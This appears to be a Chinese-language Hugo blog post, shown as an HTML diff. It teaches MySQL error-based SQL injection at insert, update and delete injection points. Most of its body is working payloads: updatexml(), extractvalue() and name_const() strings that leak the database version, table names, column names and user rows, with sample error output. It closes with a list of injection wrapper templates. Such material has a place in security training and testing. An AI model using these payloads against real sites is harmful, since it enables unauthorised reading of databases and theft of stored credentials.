@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        insert、update、delete注入 ::
+        Archerx&#39;s blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="0x00前言 利用SQL注入获取数据库数据，利用的方法可以大致分为联合查询、报错、布尔盲注以及延时注入，通常这些方法都是基于select查询语句中的SQL注射点来实现的。那么，当我们发现了一个基于insert、update、delete语句的注射点时（比如有的网站会记录用户浏览记录，包括referer、client_ip、user-agent等，还有类似于用户注册、密码修改、信息删除等功能），还可以用如上方法获取我们需要的数据吗？在这里，我们以MYSQL的显错为例，看一下如何在insert、update、delete的注入点中获取我们想要的数据。
+0x01 后台SQL语句 假设一下后台语句是这样的：
+insert into users (id, username, password) values (2,&#39;&#39;inject here&#39;&#39;,&#39;Olivia&#39;); insert into users (id, username, password) values (2,&amp;quot;&amp;quot;inject here&amp;quot;&amp;quot;,&#39;Olivia&#39;); 0x02 利用updatexml()、extractvalue()获取数据 updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。
+一般这种情况下都是用报错注入的。 payload:
+or updatexml(1,concat(0x7e,(version())),0) or or extractvalue(1,concat(0x7e,database())) or insert
+INSERT INTO users (id, username, password) VALUES (2,&#39;Olivia&#39; or updatexml(1,concat(0x7e,(version())),0) or&#39;&#39;, &#39;Nervo&#39;); updata
+UPDATE users SET password=&#39;Nicky&#39; or updatexml(2,concat(0x7e,(version())),0) or&#39;&#39;WHERE id=2 and username=&#39;Olivia&#39;; delete
+DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or&#39;&#39;; 获取表名、列名时加上group_concat()
+extractvalue()用法同上
+0x03利用name_const()获取数据 name_const()函数是MYSQL5."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/xss/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="insert、update、delete注入"/>
+<meta name="twitter:description" content="利用SQL注入获取数据库数据，利用的方法可以大致分为联合查询、报错、布尔盲注以及延时注入，通常这些方法都是基于select查询语句中的SQL注射点来实现的。那么，当我们发现了一个基于insert、update、delete语句的注射点时（比如有的网站会记录用户浏览记录，包括referer、client_ip、user-agent等，还有类似于用户注册、密码修改、信息删除等功能），还可以用如上方法获取我们需要的数据吗？在这里，我们以MYSQL的显错为例，看一下如何在insert、update、delete的注入点中获取我们想要的数据。"/>
+
+
+
+<meta property="og:title" content="insert、update、delete注入" />
+<meta property="og:description" content="利用SQL注入获取数据库数据，利用的方法可以大致分为联合查询、报错、布尔盲注以及延时注入，通常这些方法都是基于select查询语句中的SQL注射点来实现的。那么，当我们发现了一个基于insert、update、delete语句的注射点时（比如有的网站会记录用户浏览记录，包括referer、client_ip、user-agent等，还有类似于用户注册、密码修改、信息删除等功能），还可以用如上方法获取我们需要的数据吗？在这里，我们以MYSQL的显错为例，看一下如何在insert、update、delete的注入点中获取我们想要的数据。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/xss/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-22T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-03-22T00:00:00&#43;00:00" /><meta property="og:site_name" content="Archerx&#39;s blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Archerx&#39;s blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">insert、update、delete注入</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-03-22
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— By Archerx</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 2 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x00前言">0x00前言</a></li>
+        <li><a href="#0x01-后台sql语句">0x01 后台SQL语句</a></li>
+        <li><a href="#0x02-利用updatexmlextractvalue获取数据">0x02 利用updatexml()、extractvalue()获取数据</a></li>
+        <li><a href="#0x03利用name_const获取数据">0x03利用name_const()获取数据</a></li>
+        <li><a href="#0x04利用子查询注入">0x04利用子查询注入</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+      
+      <h3 id="0x00前言">0x00前言</h3>
+<p>利用SQL注入获取数据库数据，利用的方法可以大致分为联合查询、报错、布尔盲注以及延时注入，通常这些方法都是基于select查询语句中的SQL注射点来实现的。那么，当我们发现了一个基于insert、update、delete语句的注射点时（比如有的网站会记录用户浏览记录，包括referer、client_ip、user-agent等，还有类似于用户注册、密码修改、信息删除等功能），还可以用如上方法获取我们需要的数据吗？在这里，我们以MYSQL的显错为例，看一下如何在insert、update、delete的注入点中获取我们想要的数据。</p>
+<h3 id="0x01-后台sql语句">0x01 后台SQL语句</h3>
+<p>假设一下后台语句是这样的：</p>
+<pre><code>insert into users (id, username, password) values (2,''inject here'','Olivia');
+insert into users (id, username, password) values (2,&quot;&quot;inject here&quot;&quot;,'Olivia');
+</code></pre><h3 id="0x02-利用updatexmlextractvalue获取数据">0x02 利用updatexml()、extractvalue()获取数据</h3>
+<p>updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。</p>
+<p>一般这种情况下都是用报错注入的。
+payload:</p>
+<pre><code>or updatexml(1,concat(0x7e,(version())),0) or
+
+or extractvalue(1,concat(0x7e,database())) or
+</code></pre><p>insert</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo');
+</code></pre><p>updata</p>
+<pre><code>UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia';
+</code></pre><p>delete</p>
+<pre><code>DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';
+</code></pre><p>获取表名、列名时加上group_concat()</p>
+<p>extractvalue()用法同上</p>
+<h3 id="0x03利用name_const获取数据">0x03利用name_const()获取数据</h3>
+<p>name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。</p>
+<p>payload</p>
+<pre><code>or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or
+</code></pre><p>insert</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or '','Nervo');
+</code></pre><p>updata</p>
+<pre><code>UPDATE users SET password='Nicky' or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or '' WHERE id=2 and username='Nervo';
+</code></pre><p>delete</p>
+<pre><code>DELETE FROM users WHERE id=1 or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)or '';
+</code></pre><p>在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。在这里我使用MySQL5.0.45进行演示。</p>
+<p>首先，我们做一个简单的SELECT查询，检查我们是否可以提取数据。</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT 2),1),name_const((SELECT 2),1))a) or '', 'Nervo');
+</code></pre><p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。</p>
+<p>如果显示ERROR 1060 (42S21): Duplicate column name &lsquo;2&rsquo;，就可以进一步获取更多数据。</p>
+<p>获取newdb数据库表名：</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1))a) or '', 'Nervo');
+
+ERROR 1060 (42S21): Duplicate column name 'users'
+</code></pre><p>获取users表的列名：</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1),1),name_const(( SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1),1))a) or '', 'Nervo');
+
+ERROR 1060 (42S21): Duplicate column name 'id'
+</code></pre><p>获取users表的数据：</p>
+<pre><code>INSERT INTO users (id, username, password) VALUES (2,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit
+0,1),1))a) or '', 'Nervo');
+
+ERROR 1060 (42S21): Duplicate column name '1~Jane~Eyre'
+</code></pre><h3 id="0x04利用子查询注入">0x04利用子查询注入</h3>
+<pre><code>' or (payload) or '
+' and (payload) and '
+' or (payload) and '
+' or (payload) and '='
+'* (payload) *'
+' or (payload) and '
+&quot; – (payload) – &quot;
+</code></pre>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/hello/">
+                  <span class="button__text">Hello Friend</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Archerx&#39;s blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+        <span
+          >Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
